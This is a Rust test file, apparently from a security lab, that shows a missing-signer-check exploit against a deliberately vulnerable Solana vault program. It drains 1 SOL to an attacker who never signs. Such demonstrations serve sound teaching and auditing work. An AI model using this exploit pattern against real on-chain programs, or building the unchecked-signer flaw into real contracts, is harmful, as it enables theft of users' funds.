use solana_program_test::{processor, ProgramTest};
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};

use vault_vulnerable::process;

const VAULT_LAMPORTS: u64 = 10_000_000_000; // 10 SOL held by the vault
const AMOUNT: u64 = 1_000_000_000; // 1 SOL withdrawn

fn attack_ix(program: &Pubkey, vault: &Pubkey, recipient: &Pubkey, amount: u64) -> Instruction {
    Instruction {
        program_id: *program,
        accounts: vec![
            AccountMeta::new(*vault, false),
            AccountMeta::new(*recipient, false), // NOT marked as signer: that is the bug
        ],
        data: amount.to_le_bytes().to_vec(),
    }
}

#[tokio::test]
async fn attack_withdraw_without_signature() {
    let program = Pubkey::new_unique();
    let vault = Pubkey::new_unique();
    let attacker = Keypair::new();

    let mut pt = ProgramTest::new("vault_vulnerable", program, processor!(process));
    pt.add_account(
        vault,
        Account {
            lamports: VAULT_LAMPORTS,
            data: vec![0u8; 8],
            owner: program,
            ..Account::default()
        },
    );

    let mut ctx = pt.start_with_context().await;
    let payer = ctx.payer.insecure_clone();

    let tx = Transaction::new_signed_with_payer(
        &[attack_ix(&program, &vault, &attacker.pubkey(), AMOUNT)],
        Some(&payer.pubkey()),
        &[&payer], // the attacker never signs
        ctx.last_blockhash,
    );
    let result = ctx.banks_client.process_transaction(tx).await;
    assert!(result.is_ok(), "withdraw should have succeeded (that is the bug): {result:?}");

    let vault_after = ctx
        .banks_client
        .get_account(vault)
        .await
        .unwrap()
        .unwrap()
        .lamports;
    let attacker_after = ctx
        .banks_client
        .get_account(attacker.pubkey())
        .await
        .unwrap()
        .map(|a| a.lamports)
        .unwrap_or(0);

    println!("vault: {} -> {}", VAULT_LAMPORTS, vault_after);
    println!("attacker received: {}", attacker_after);

    assert_eq!(vault_after, VAULT_LAMPORTS - AMOUNT, "vault lost the funds");
    assert_eq!(attacker_after, AMOUNT, "attacker gained the funds");
}
